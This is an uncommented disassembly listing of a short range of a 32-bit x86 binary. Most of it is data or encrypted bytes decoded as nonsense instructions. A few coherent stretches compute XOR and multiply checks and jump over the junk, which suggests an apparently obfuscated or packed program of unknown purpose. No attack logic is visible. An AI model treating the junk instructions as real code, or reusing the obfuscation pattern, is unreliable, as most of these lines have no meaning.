  40a855:	cdq    
  40a856:	xchg   esp,eax
  40a857:	pop    edx
  40a858:	fstp   DWORD PTR [esi+ebx*2+0x1a1a59d1]
  40a85f:	ror    ch,0xb0
  40a862:	sbb    al,0xcc
  40a864:	idiv   BYTE PTR [ebp-0x52]
  40a867:	ret    
  40a868:	and    dl,dl
  40a86a:	xor    DWORD PTR [ebx+0x16896a93],ecx
  40a870:	or     eax,0x4b6755d6
  40a875:	mov    cl,0xb5
  40a877:	enter  0xc4e1,0x94
  40a87b:	jle    0x40a8cd
  40a87d:	fucomp st(0)
  40a87f:	push   esi
  40a880:	(bad)  
  40a881:	mov    al,ds:0xe5174adc
  40a886:	push   edx
  40a887:	shr    BYTE PTR [edx+0x1f839cf],0xa5
  40a88e:	or     esi,ecx
  40a890:	mov    bl,0x7e
  40a892:	les    esi,FWORD PTR [ebp+ebp*2-0x3d]
  40a896:	pushf  
  40a897:	xchg   DWORD PTR [edx],ebp
  40a899:	ror    cl,0xaa
  40a89c:	pushf  
  40a89d:	outs   dx,BYTE PTR ds:[esi]
  40a89e:	mov    cl,0x82
  40a8a0:	inc    eax
  40a8a1:	cdq    
  40a8a2:	pop    esi
  40a8a3:	icebp  
  40a8a4:	pop    si
  40a8a6:	xor    bh,ch
  40a8a8:	adc    BYTE PTR fs:0xc9ce49b7,bl
  40a8af:	fidiv  WORD PTR [ecx+0xe]
  40a8b2:	fwait
  40a8b3:	mov    ds:0xee328c48,al
  40a8b8:	pop    ds
  40a8b9:	jae    0x40a891
  40a8bb:	add    esi,DWORD PTR [edi+0x42b23a6e]
  40a8c1:	pop    edx
  40a8c2:	nop
  40a8c3:	addr16 leave 
  40a8c5:	les    esp,FWORD PTR [esi+eax*2]
  40a8c8:	inc    esp
  40a8c9:	test   DWORD PTR [edx+0x165d87ba],0xaa6f1578
  40a8d3:	xor    BYTE PTR [esi-0x65],dl
  40a8d6:	mov    ecx,0x6ab6ab3
  40a8db:	mov    dl,0xc4
  40a8dd:	adc    dl,BYTE PTR [edx+0x6fa6911a]
  40a8e3:	pop    ss
  40a8e4:	adc    esi,DWORD PTR [esi-0x4a8d9ea7]
  40a8ea:	pop    es
  40a8eb:	pop    ebp
  40a8ec:	mov    ecx,0xc3dc45d1
  40a8f1:	sahf   
  40a8f2:	or     al,0xf6
  40a8f5:	inc    ebx
  40a8f6:	jmp    0x40a90b
  40a8f8:	fnsave [ebx]
  40a8fa:	scas   al,BYTE PTR es:[edi]
  40a8fb:	mov    al,ds:0x78d25444
  40a900:	jmp    0x4ae3:0x71fb9032
  40a907:	imul   edx,DWORD PTR [esi-0x75],0x60
  40a90b:	push   ds
  40a90c:	arpl   WORD PTR [edi],bx
  40a90e:	sbb    ecx,DWORD PTR [edi]
  40a910:	in     eax,0x67
  40a912:	pop    edx
  40a913:	jbe    0x40a94d
  40a915:	cdq    
  40a916:	rcr    esi,cl
  40a918:	iret   
  40a919:	pusha  
  40a91a:	stos   BYTE PTR es:[edi],al
  40a91b:	fmul   DWORD PTR [edx-0xd]
  40a91e:	and    ch,al
  40a920:	mov    ds:0x70cf3ea9,al
  40a925:	iret   
  40a926:	sub    eax,0x7a20f262
  40a92b:	sahf   
  40a92c:	cmp    ebp,eax
  40a92e:	mov    edx,DWORD PTR [edi+0x3dea2378]
  40a934:	jle    0x40a92e
  40a936:	inc    esi
  40a937:	and    al,0x92
  40a939:	call   0x558b:0xb50ee350
  40a940:	aas    
  40a941:	xor    DWORD PTR [ebp-0x2ff8f601],0x4243429a
  40a94b:	adc    eax,DWORD PTR [ebx+0x5ced2955]
  40a951:	retf   
  40a952:	or     al,0xbe
  40a954:	mov    ds:0x98da1d4c,eax
  40a959:	bnd jl 0x40a9cf
  40a95c:	sbb    dh,BYTE PTR ds:[eax]
  40a95f:	cmp    ch,BYTE PTR [esi-0x7cc8afeb]
  40a965:	or     BYTE PTR [ebp+0x8],ah
  40a968:	mov    al,ds:0xbf20d8c9
  40a96d:	fcomp  QWORD PTR [ecx]
  40a96f:	mov    esp,0xf51ec9a4
  40a974:	stos   BYTE PTR es:[edi],al
  40a975:	pushf  
  40a976:	xchg   esi,eax
  40a977:	jecxz  0x40a9ec
  40a979:	(bad)  
  40a97a:	push   esi
  40a97b:	dec    edx
  40a97c:	xor    ebp,DWORD PTR [ecx+0x39]
  40a97f:	test   al,0x73
  40a981:	sub    al,0x61
  40a983:	cs aam 0xde
  40a986:	ret    0xdfa0
  40a989:	xchg   esi,eax
  40a98a:	or     edx,DWORD PTR [ebx]
  40a98c:	(bad)  
  40a98d:	and    eax,0x8278eaa5
  40a992:	cmp    esp,DWORD PTR [ebx-0x2a]
  40a995:	xor    edi,0x32
  40a998:	adc    BYTE PTR [ecx-0x13],ch
  40a99b:	mov    al,ds:0xc24dc1a5
  40a9a0:	ds test eax,0xbf8c8661
  40a9a6:	int    0x23
  40a9a8:	jecxz  0x40a937
  40a9aa:	mov    ebp,0x31054b2f
  40a9af:	rol    bl,cl
  40a9b1:	test   edi,0x914b99f5
  40a9b7:	popf   
  40a9b8:	call   0xdcb8f20a
  40a9bd:	jge    0x40a998
  40a9bf:	pop    edi
  40a9c0:	mov    dh,0x3f
  40a9c2:	(bad)  
  40a9c3:	ins    DWORD PTR es:[edi],dx
  40a9c4:	cmp    DWORD PTR [esi-0x2f],ecx
  40a9c7:	dec    ch
  40a9c9:	pop    esi
  40a9ca:	sub    eax,0x4e6f35c0
  40a9cf:	js     0x40aa12
  40a9d1:	shr    ebx,cl
  40a9d3:	popf   
  40a9d4:	cmp    BYTE PTR [ecx-0x2f5f3edc],ah
  40a9da:	jmp    0x7b85ebbd
  40a9df:	pop    esi
  40a9e0:	jns    0x40a965
  40a9e2:	pop    edi
  40a9e3:	xchg   ecx,eax
  40a9e4:	lock inc edi
  40a9e6:	jge    0x40a987
  40a9e8:	jmp    0x89424b11
  40a9ed:	out    dx,eax
  40a9ee:	or     eax,ebx
  40a9f0:	xchg   edx,eax
  40a9f1:	loop   0x40aa1a
  40a9f3:	or     cl,dl
  40a9f5:	test   ebx,ecx
  40a9f7:	les    esi,FWORD PTR [edx+0x2d]
  40a9fa:	retf   0x73fe
  40a9fd:	or     al,0xf2
  40a9ff:	cmp    BYTE PTR [ebp+0x7d7582f7],ah
  40aa05:	stc    
  40aa06:	adc    al,0x20
  40aa08:	sbb    BYTE PTR [edx+0x37b459b6],al
  40aa0e:	xor    esp,DWORD PTR [esi+0x238276ab]
  40aa14:	and    esp,ebx
  40aa16:	pushf  
  40aa17:	mov    al,ds:0xf2e8e090
  40aa1c:	lods   eax,DWORD PTR ds:[esi]
  40aa1d:	ret    0x5c0e
  40aa20:	pop    esi
  40aa21:	dec    ebp
  40aa22:	imul   ebp,edi,0xffffffe6
  40aa25:	test   eax,0xc745c57b
  40aa2a:	inc    ebp
  40aa2b:	cld    
  40aa2c:	xor    al,BYTE PTR [ebp-0x2ef40764]
  40aa32:	mov    eax,DWORD PTR [ebp-0x4]
  40aa35:	push   esi
  40aa36:	or     ecx,edx
  40aa38:	mov    esi,DWORD PTR [ebp-0x8]
  40aa3b:	add    ecx,ecx
  40aa3d:	mov    edx,0x7510856
  40aa42:	xor    eax,edx
  40aa44:	xor    DWORD PTR ds:0x42e762,0x78fe
  40aa4e:	xor    esi,edx
  40aa50:	dec    ecx
  40aa51:	mov    ecx,0x32729d
  40aa56:	add    esi,ecx
  40aa58:	add    DWORD PTR ds:0x43055a,0x42e762
  40aa62:	add    eax,ecx
  40aa64:	imul   eax,esi
  40aa67:	mov    esi,DWORD PTR [ebp+0xc]
  40aa6a:	mov    DWORD PTR ds:0x42e75a,0x6fc4
  40aa74:	cmp    esi,eax
  40aa76:	mov    DWORD PTR ds:0x430556,0x4d9
  40aa80:	jne    0x40ae92
  40aa86:	mov    eax,DWORD PTR [ebp-0x4]
  40aa89:	mov    esi,DWORD PTR [ebp-0x8]
  40aa8c:	jmp    0x40ac87
  40aa91:	fisubr DWORD PTR [ebp-0x80]
  40aa94:	cld    
  40aa95:	mov    eax,ds:0x406d7afd
  40aa9a:	adc    DWORD PTR [ecx-0x7],esp
  40aa9d:	leave  
  40aa9e:	sti    
  40aa9f:	xor    dl,BYTE PTR ds:0x7e7eed73
  40aaa5:	pop    esp
  40aaa6:	jg     0x40ab26
  40aaa8:	jle    0x40aafd
  40aaaa:	dec    ecx
  40aaab:	in     al,dx
  40aaac:	adc    esi,esi
  40aaae:	into   
  40aaaf:	and    al,BYTE PTR [esi+0x7e]
  40aab2:	pop    ds
  40aab3:	out    dx,eax
  40aab4:	int3   
  40aab5:	loop   0x40aa3d
  40aab7:	iret   
  40aab8:	adc    dl,dh
  40aaba:	mov    ch,0x62
  40aabc:	(bad)  
  40aabe:	imul   ecx,DWORD PTR [edx-0x732bcaf7],0x71
  40aac5:	adc    al,0x10
  40aac7:	mul    eax
  40aac9:	jp     0x40aa91
  40aacb:	repz push ebp
  40aacd:	xchg   esi,eax
  40aace:	mov    esp,0xab4b930a
  40aad3:	shl    DWORD PTR [esi-0x7e441bce],cl
  40aad9:	pop    ecx
  40aada:	je     0x40aabb
  40aadc:	rcr    BYTE PTR [edi-0x58],cl
  40aadf:	cdq    
  40aae0:	das    
  40aae1:	dec    esp
  40aae2:	jle    0x40aaa6
  40aae4:	sahf   
  40aae5:	mov    ebp,0xd0e1f97c
  40aaea:	mov    ecx,esi
  40aaec:	cmc    
  40aaed:	xchg   ebp,eax
  40aaee:	push   ebp
  40aaef:	cli    
  40aaf0:	fs js  0x40ab46
  40aaf3:	adc    BYTE PTR [ecx],bh
  40aaf5:	cmp    al,0xe8
  40aaf7:	push   DWORD PTR [esi]
  40aaf9:	inc    esi
  40aafa:	pop    edx
  40aafb:	inc    ecx
  40aafc:	out    dx,eax
  40aafd:	xor    DWORD PTR [edx],ebp
  40aaff:	ins    DWORD PTR es:[edi],dx
  40ab00:	pop    ebx
  40ab01:	int3   
  40ab02:	inc    ecx
  40ab03:	pop    es
  40ab04:	jge    0x40aa98
  40ab06:	or     edi,esp
  40ab08:	aam    0xfd
  40ab0a:	sbb    ecx,DWORD PTR [ebp-0x1f]
  40ab0d:	inc    edi
  40ab0e:	sub    eax,0x75e537d4
  40ab13:	les    ecx,FWORD PTR [ebx-0x68]
  40ab16:	push   ecx
  40ab17:	scas   eax,DWORD PTR es:[edi]
  40ab18:	dec    edi
  40ab19:	(bad)  
  40ab1a:	fadd   DWORD PTR [edi+0x1a]
  40ab1d:	sub    al,0x5e
  40ab1f:	and    BYTE PTR [esi+eax*8+0x9],ch
  40ab23:	push   ss
  40ab24:	cmp    eax,ebp
  40ab26:	call   0x6fd5ab7b
  40ab2b:	inc    edi
  40ab2c:	out    0x1f,eax
  40ab2e:	sub    ebx,DWORD PTR [esi-0x24]
  40ab31:	or     dl,BYTE PTR [ebx]
  40ab33:	test   BYTE PTR [esi],dl
  40ab35:	out    0xeb,eax
  40ab37:	push   0xd
  40ab39:	arpl   sp,bx
  40ab3b:	sar    DWORD PTR [ecx-0x36],cl
  40ab3e:	dec    ebx
  40ab3f:	fcmovu st,st(0)
  40ab41:	and    BYTE PTR gs:[ebx-0x35defce],bl
  40ab48:	shl    BYTE PTR [esi+0x51a59884],1
  40ab4e:	jbe    0x40ab71
  40ab50:	mov    eax,ds:0x86538c57
  40ab55:	iret   
  40ab56:	je     0x40aadc
  40ab58:	pop    ecx
  40ab59:	test   ebp,ebp
  40ab5b:	in     al,dx
  40ab5c:	xor    al,0x58
  40ab5e:	aam    0x3f
  40ab60:	sub    al,0x73
  40ab63:	ds clc 
  40ab65:	and    BYTE PTR [edx+esi*1],dl
  40ab68:	jmp    0x40ab90
  40ab6a:	mov    dh,0x27
  40ab6c:	ror    esp,0xf4
  40ab6f:	push   es
  40ab70:	xchg   ebp,eax
  40ab71:	pop    ebp
  40ab72:	icebp  
  40ab73:	sahf   
  40ab74:	(bad)  
  40ab75:	ret    0x9c27
  40ab78:	jge    0x40abb3
  40ab7a:	inc    esp
  40ab7b:	mov    WORD PTR ds:0xc10537ef,gs
  40ab81:	sahf   
  40ab82:	aad    0xb4
  40ab84:	push   esp
  40ab85:	jp     0x40abac
  40ab87:	outs   dx,DWORD PTR ds:[esi]
  40ab88:	sbb    eax,0x13ce5ed4
  40ab8d:	inc    edx
  40ab8e:	cs in  al,0x77
  40ab91:	mov    bh,0xbd
  40ab93:	mov    edi,0xf266cce3
  40ab98:	inc    esp
  40ab99:	sub    esp,edx
  40ab9b:	cmp    edx,DWORD PTR [esi-0x7f7e52e4]
  40aba1:	jmp    0x1115:0xcf9720cb
  40aba8:	xor    cl,BYTE PTR [edx+0x1e170f3d]
  40abae:	shl    BYTE PTR [esi],cl
  40abb0:	lock xchg BYTE PTR [ebp+0x7],ah
  40abb4:	dec    ebp
  40abb5:	pop    esp
  40abb6:	xchg   esp,eax
  40abb7:	add    cl,cl
  40abb9:	jnp    0x40ab65
  40abbb:	jnp    0x40abc4
  40abbd:	jl     0x40abd9
  40abbf:	cwde   
  40abc0:	lock xchg DWORD PTR [ebx],esi
  40abc3:	repnz lock pop edx
  40abc6:	or     BYTE PTR ds:0xd9976c36,0x31
  40abcd:	sbb    bh,cl
  40abcf:	into   
  40abd0:	push   cs
  40abd1:	into   
  40abd2:	inc    eax
  40abd3:	pop    edx
  40abd4:	push   cs
  40abd5:	and    al,0x77
  40abd7:	or     ebx,DWORD PTR [ecx-0x37]
  40abda:	sbb    ch,BYTE PTR [ebp+0x76]
  40abdd:	into   
  40abde:	inc    edx
  40abdf:	and    al,0xbe
  40abe1:	(bad)  [edx+0x267770e2]
  40abe7:	(bad)  
  40abe8:	in     eax,0xb0
  40abea:	xchg   BYTE PTR [esi],bh
  40abec:	xor    al,0xf
  40abee:	inc    ebx
  40abef:	or     esp,DWORD PTR [ebp+0x77b380b9]
  40abf5:	shl    DWORD PTR [eax-0x11e231a4],0x11
  40abfc:	mov    eax,0xf3337775
  40ac01:	ja     0x40abc2
  40ac03:	jmp    0x8bf8:0x97646a24
  40ac0a:	push   ds
  40ac0b:	push   0x23
  40ac0d:	mov    ebx,0xd52e8ef9
  40ac12:	xchg   ebx,eax
  40ac13:	loope  0x40ab9d
  40ac15:	push   edi
  40ac16:	fdivr  DWORD PTR [edx+0x78]
  40ac19:	xchg   esi,eax
  40ac1a:	arpl   WORD PTR [eax+0x6b],ax
  40ac1d:	or     eax,0x9916ac10
  40ac22:	jnp    0x40abc5
  40ac24:	call   0xae74:0x699d0497
  40ac2b:	sub    ebp,esi
  40ac2d:	addr16 dec edi
  40ac2f:	mov    DWORD PTR [ecx],edi
  40ac31:	call   0x9643:0x8bd36026
  40ac38:	bound  esp,QWORD PTR [eax]
  40ac3a:	push   edx
  40ac3b:	jle    0x40ac4b
  40ac3d:	push   ebp
  40ac3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3f:	inc    esi
  40ac40:	xchg   esi,eax
  40ac41:	inc    edi
  40ac42:	test   BYTE PTR [eax],ah
  40ac44:	cmp    eax,0xc84f4e83
  40ac49:	ficom  DWORD PTR [edi+0x5097b7f0]
  40ac4f:	dec    edi
  40ac50:	std    
  40ac51:	pop    eax
  40ac52:	popf   
  40ac53:	and    BYTE PTR [ebp-0x5d],dl
  40ac56:	in     al,dx
  40ac57:	cmp    al,cl
  40ac59:	mov    ah,0x14
  40ac5b:	call   0x9ad1:0x689686c1
  40ac62:	adc    eax,DWORD PTR [ebp-0x71]
  40ac65:	loop   0x40acda
  40ac67:	pop    ebp
  40ac68:	add    al,0x91
  40ac6a:	xchg   ebx,eax
  40ac6b:	ja     0x40ac62
  40ac6d:	hlt    
  40ac6e:	add    eax,0xbda21715
  40ac73:	(bad)  
  40ac74:	jmp    0xc8fc352d
  40ac79:	jmp    0x64d64e98
  40ac7e:	in     al,dx
  40ac7f:	mov    eax,ds:0xa80b9cfc
  40ac84:	shl    cl,1
  40ac86:	jb     0x40acbb
  40ac88:	ret    0xf233
  40ac8b:	add    eax,ecx
  40ac8d:	jmp    0x40ae88
  40ac92:	pop    ebp
  40ac93:	icebp  
  40ac94:	lds    esp,FWORD PTR [eax-0x23]
  40ac97:	fs jge 0x40ac47
  40ac9a:	xchg   edi,eax
  40ac9b:	imul   ebx,edx,0x4b0c3d02
  40aca1:	call   0x7f5c:0x7e7eee51
  40aca8:	jle    0x40ad28
  40acaa:	lods   al,BYTE PTR ds:[esi]
  40acab:	stos   BYTE PTR es:[edi],al
  40acac:	jle    0x40acd9
  40acae:	adc    DWORD PTR [esi-0x52],esp
  40acb1:	sub    al,0x78
  40acb3:	adc    al,0x8e
  40acb5:	neg    edx
  40acb7:	shr    BYTE PTR [ebx+0x14],0x19
  40acbb:	leave  
  40acbc:	repnz stos DWORD PTR es:[edi],eax
  40acbe:	leave  
  40acbf:	inc    ecx
  40acc0:	sbb    DWORD PTR [edi-0x74cf69e],0x5b60754e
  40acca:	jle    0x40acf0
  40accc:	mov    ah,0x6d
  40acce:	mov    ebx,0x2a1215b9
  40acd3:	mov    cl,0x8b
  40acd5:	out    0x52,al
  40acd7:	mov    esp,ebx
  40acd9:	fs int3 
  40acdb:	mov    ch,0xa0
  40acdd:	lods   eax,DWORD PTR ds:[esi]
  40acde:	jae    0x40ad3e
  40ace0:	xor    bl,BYTE PTR [edx+0x4c]
  40ace3:	(bad)  
  40ace4:	pusha  
  40ace5:	test   eax,0x836f00fb
  40acea:	inc    edx
  40aceb:	cld    
  40acec:	stos   BYTE PTR es:[edi],al
  40aced:	dec    ebx
  40acee:	lods   al,BYTE PTR ds:[esi]
  40acef:	xchg   ebp,eax
  40acf0:	jbe    0x40accf
  40acf2:	sbb    dh,dh
  40acf4:	adc    al,0xf2
  40acf6:	stos   DWORD PTR es:[edi],eax
  40acf7:	mov    bl,0x3f
  40acf9:	out    0xaa,eax
  40acfb:	add    al,0x8f
  40acfd:	(bad)  
  40acfe:	js     0x40ad1f
  40ad00:	adc    BYTE PTR [edx-0x45],dl
  40ad03:	mov    ch,0x79
  40ad05:	ss test al,0x27
  40ad08:	stos   BYTE PTR es:[edi],al
  40ad09:	aad    0xfa
  40ad0b:	mov    ecx,0xa72f304a
  40ad10:	je     0x40ad7c
  40ad12:	mov    ch,0x3c
  40ad14:	scas   eax,DWORD PTR es:[edi]
  40ad15:	cmc    
  40ad16:	shl    DWORD PTR [ebp+ebx*1-0x5d2a627d],0x40
  40ad1e:	mov    ?,WORD PTR [ebx]
  40ad20:	call   0x34a5:0xf9604156
  40ad27:	mov    WORD PTR [edx-0x5c86a871],?
  40ad2d:	aad    0xf9
  40ad2f:	push   edi
  40ad30:	add    BYTE PTR [ebp+0x6d379b9e],cl
  40ad36:	dec    ecx
  40ad37:	mov    ebp,0xb77caaee
  40ad3c:	mov    esi,0x6c1aff09
  40ad42:	push   cs
  40ad43:	pop    ecx
  40ad44:	jp     0x40ad10
  40ad46:	adc    bh,bl
  40ad48:	mov    eax,ds:0xc5fcc366
  40ad4d:	fdivrp st(6),st
  40ad4f:	stos   DWORD PTR es:[edi],eax
  40ad50:	lds    edi,FWORD PTR [esp+eax*1-0x43]
  40ad54:	jecxz  0x40acec
  40ad56:	sar    esp,1
  40ad58:	out    dx,al
  40ad59:	in     eax,dx
  40ad5a:	adc    BYTE PTR [ebx+0x3c9d5c],dl
  40ad60:	adc    BYTE PTR [edi+0xe],ch
  40ad63:	add    al,bl
  40ad65:	retf   0x786f
  40ad68:	cmp    eax,0x989aeb09
  40ad6d:	(bad)  
  40ad6e:	push   ebx
  40ad6f:	cld    
  40ad70:	xchg   ebx,eax
  40ad71:	add    esi,DWORD PTR [ecx+edi*1]
  40ad74:	je     0x40adeb
  40ad76:	xchg   ebp,eax
  40ad77:	jns    0x40ad71
  40ad79:	or     eax,0x10e1de58
  40ad7e:	ror    dl,0x2d
  40ad81:	jge    0x40ad3f
  40ad83:	(bad)  
  40ad84:	dec    edi
  40ad85:	sbb    esp,DWORD PTR [esi+0x461c79a4]
  40ad8b:	in     eax,0x3
  40ad8d:	push   edi
  40ad8e:	pop    esp
  40ad8f:	dec    eax
  40ad90:	mov    eax,0x800aea8
  40ad95:	clc    
  40ad96:	dec    esp
  40ad97:	mov    al,0x29
  40ad99:	xcrypt-cfb (bad)
  40ad9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9b:	and    DWORD PTR [ebx],eax
  40ad9d:	inc    edi
  40ad9e:	inc    ebp
  40ad9f:	mov    ebp,0x75a885d7
  40ada4:	inc    ebp
  40ada5:	or     al,BYTE PTR [eax+ebp*8-0x16]
  40ada9:	xchg   edi,eax
  40adaa:	in     eax,dx
  40adab:	mov    al,BYTE PTR [ecx+0x50110d7b]
  40adb1:	jmp    0x5d86279d
  40adb6:	xchg   edi,eax
  40adb7:	xchg   ecx,eax
  40adb8:	jb     0x40ada7
  40adba:	inc    edx
  40adbb:	inc    ebp
  40adbc:	out    0xf5,eax
  40adbe:	fst    DWORD PTR [ecx+0x2b]
  40adc1:	fisubr WORD PTR [edx*4-0x343abd71]
  40adc8:	xchg   ebp,eax
  40adc9:	xchg   edi,eax
  40adca:	pop    ebp
  40adcb:	xlat   BYTE PTR ds:[ebx]
  40adcc:	(bad)  
  40adcd:	sbb    al,BYTE PTR [ebx]
  40adcf:	call   0x2250d69c
  40add4:	push   cs
  40add5:	and    edi,DWORD PTR [edx+0x52]
  40add8:	(bad)  
  40add9:	mov    dl,0xa7
  40addb:	inc    esp
  40addc:	xor    al,0xb9
  40adde:	sbb    esp,ebp
  40ade0:	pop    esi
  40ade1:	mov    bh,0xec
  40ade3:	fisttp DWORD PTR [edx]
  40ade5:	fldenv [ecx+0x2]
  40ade8:	mov    eax,0xe6cefa63
  40aded:	sub    bl,dl
  40adef:	fs retf 0x5fb0
  40adf3:	dec    esp
  40adf4:	sub    eax,0x1aa4da60
  40adf9:	inc    ecx
  40adfa:	(bad)  
  40adfb:	pusha  
  40adfc:	nop
  40adfd:	out    dx,al
  40adfe:	mov    ch,0xe9
  40ae00:	push   cs
  40ae01:	dec    edx
  40ae02:	cdq    
  40ae03:	pushf  
  40ae04:	dec    ebx
  40ae05:	ds push edx
  40ae07:	fiadd  WORD PTR [ebx+0x8786eda]
  40ae0d:	retf   0x4890
  40ae10:	stos   DWORD PTR es:[edi],eax
  40ae11:	mov    eax,ds:0x54d70ad0
  40ae16:	jecxz  0x40ae2d
  40ae18:	xchg   ch,bl
  40ae1a:	cmc    
  40ae1b:	arpl   WORD PTR [edi+ecx*2+0xa8fbfe8],si
  40ae22:	jmp    0xd43467cf
  40ae27:	inc    ebp
  40ae28:	int3   
  40ae29:	jno    0x40aded
  40ae2b:	idiv   BYTE PTR [ebx+0x42d9d7d6]
  40ae31:	outs   dx,DWORD PTR ds:[esi]
  40ae32:	not    DWORD PTR [edx]
  40ae34:	mov    ds:0xaa0544c1,al
  40ae39:	popa   
  40ae3a:	fmul   QWORD PTR [esi-0x1f]
  40ae3d:	sbb    eax,0xf5cdb634
  40ae42:	xchg   ebp,eax
  40ae43:	add    edx,edi
  40ae45:	cmc    
  40ae46:	xor    al,0x5d
  40ae48:	and    eax,0x7079a2f0
  40ae4d:	mov    al,ds:0x328e0a2d
  40ae52:	pusha  
  40ae53:	add    ah,ah
  40ae55:	pushf  
  40ae56:	sub    eax,0x9022c70c
  40ae5b:	sub    BYTE PTR [esi+ecx*2-0x3539e3ca],dl
  40ae62:	mov    ah,BYTE PTR [ecx+0x44]
  40ae65:	or     eax,0xf13353c8
  40ae6a:	inc    esp
  40ae6b:	push   cs
  40ae6c:	mov    al,ds:0x449c7077
  40ae71:	fdivr  st,st(4)
  40ae73:	inc    esi
  40ae74:	aas    
  40ae75:	adc    DWORD PTR ss:[eax-0x1b],edx
  40ae79:	in     al,0x64
  40ae7b:	xchg   edi,eax
  40ae7c:	mov    ah,0xe5
  40ae7e:	or     DWORD PTR [ebp-0x4a9e7d4e],esp
  40ae84:	aam    0x72
  40ae86:	mov    bl,0xfa
  40ae88:	add    esi,ecx
  40ae8a:	imul   eax,esi
  40ae8d:	jmp    0x40b2c3
  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock mov cl,0xcf
  40aeb4:	stc    
  40aeb5:	xor    bh,BYTE PTR [edi+0x5c7e7ee0]
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40aee7
  40aebf:	sub    al,0xb7
  40aec1:	or     al,0x81
  40aec3:	std    
  40aec4:	xorps  xmm1,XMMWORD PTR [eax+0x25]
  40aec8:	fwait
  40aec9:	mov    esp,0x100d26cf
  40aece:	inc    esp
  40aecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aed0:	and    al,0x2e
  40aed2:	pop    es
  40aed3:	data16 jns 0x40ae95
  40aed6:	mov    al,ds:0xdc6f6287
  40aedb:	loope  0x40aee0
  40aedd:	xchg   esi,eax
  40aede:	jp     0x40ae86
  40aee0:	pop    ebp
  40aee1:	push   ds
  40aee2:	popf   
  40aee3:	and    eax,0xb947fd05
  40aee8:	clc    
  40aee9:	and    dl,BYTE PTR ds:0x8797
  40aeee:	push   ss
  40aeef:	add    ah,BYTE PTR [ecx]
  40aef1:	outs   dx,BYTE PTR ds:[esi]
  40aef2:	mov    edx,?
  40aef4:	dec    ebp
  40aef5:	inc    esp
  40aef6:	(bad)  
  40aef7:	stc    
  40aef8:	jb     0x40ae80
  40aefa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aefb:	test   DWORD PTR [ecx+0x5310357b],0xd539a019
  40af05:	push   esi
  40af06:	jb     0x40aead
  40af08:	mov    al,0x7d
  40af0a:	mov    al,0xe7
  40af0c:	push   edi
  40af0d:	sbb    bl,dh
  40af0f:	jge    0x40aeb1
  40af11:	sbb    ch,ah
  40af13:	push   0xd408d566
  40af18:	jno    0x40aef6
  40af1a:	frstor [eax-0x71]
  40af1d:	fadd   st,st(3)
  40af1f:	dec    esp
  40af20:	pop    edi
  40af21:	ror    BYTE PTR [edi-0x78],1
  40af24:	daa    
  40af25:	addr16 mov ds:0x246b,al
  40af29:	daa    
  40af2a:	sub    DWORD PTR [edx+0x73df461f],ebp
  40af30:	lea    esp,[ebp+0x7524d02f]
  40af36:	jno    0x40af17
  40af38:	mov    ds:0x3e800a8e,eax
  40af3d:	test   eax,ebx
  40af3f:	mov    al,0xb5
  40af41:	push   ebp
  40af42:	in     al,0xaa
  40af44:	mov    ecx,0x13ef87ba
  40af49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af4a:	test   DWORD PTR [ebp+ecx*8+0x24],ecx
  40af4e:	dec    eax
  40af4f:	xchg   ebx,eax
  40af50:	cmp    BYTE PTR [ecx],0x36
  40af53:	xor    esi,DWORD PTR [ebx+esi*1+0x288147df]
  40af5a:	test   BYTE PTR [ecx+eax*8-0x214b9968],bh
  40af61:	addr16 mov ah,0x21
  40af64:	int    0x42
  40af66:	pop    ecx
  40af67:	(bad)  
  40af68:	sub    BYTE PTR [edi+eiz*8+0xb6a2502],ch
  40af6f:	dec    ebp
  40af70:	ficomp DWORD PTR [ecx-0x250eaf21]
  40af76:	jns    0x40aef9
  40af78:	fwait
  40af79:	das    
  40af7a:	mov    DWORD PTR [ebp-0x7b2e01e7],edx
  40af80:	mov    ds:0x5e3ca80a,al
  40af85:	jo     0x40afe2
  40af87:	jmp    0xca6b:0xd47d041
  40af8e:	(bad)  
  40af8f:	mov    ah,0x9c
  40af91:	ins    DWORD PTR es:[edi],dx
  40af92:	or     dl,BYTE PTR [ecx-0x78]
  40af95:	xchg   edi,eax
  40af96:	aad    0xb2
  40af98:	jmp    0x4a6cdf70
  40af9d:	inc    edx
  40af9e:	push   ss
  40af9f:	add    eax,0x15988ea3
  40afa4:	shr    edx,1
  40afa6:	sub    BYTE PTR es:[bx+di],bl
  40afaa:	xlat   BYTE PTR ds:[ebx]
  40afab:	fisubr WORD PTR [ecx-0x55b60a5b]
  40afb1:	jle    0x40b032
  40afb3:	aas    
  40afb4:	leave  
  40afb5:	inc    ebx
  40afb6:	and    BYTE PTR [edx+0x313f60cd],cl
  40afbc:	(bad)  
  40afbd:	mov    edx,0x13775ba1
  40afc2:	cmp    eax,0x3870bcf5
  40afc7:	add    ah,BYTE PTR ds:0xa2ac6455
  40afcd:	xchg   esp,eax
  40afce:	imul   edi,DWORD PTR [eax],0xfd3f04f
  40afd4:	xor    eax,0x403d1f2e
  40afd9:	sub    BYTE PTR [esi],bh
  40afdb:	call   0x4eba881
  40afe0:	sub    al,0xcb
  40afe2:	pop    edi
  40afe3:	ins    DWORD PTR es:[edi],dx
  40afe4:	xchg   edi,eax
  40afe5:	inc    ebp
  40afe6:	jp     0x40afd2
  40afe8:	mov    ss,WORD PTR ds:0x17ad82b7
  40afee:	mov    ch,0x9f
  40aff0:	out    0xf2,al
  40aff2:	loope  0x40b00c
  40aff4:	inc    edi
  40aff5:	data16 test bl,dh
  40aff8:	sbb    edi,DWORD PTR [ecx+0xd03f4a3]
  40affe:	loop   0x40b036
  40b000:	mov    dl,0xe0
  40b002:	jmp    0x40b05f
  40b004:	lock lods al,BYTE PTR ds:[esi]
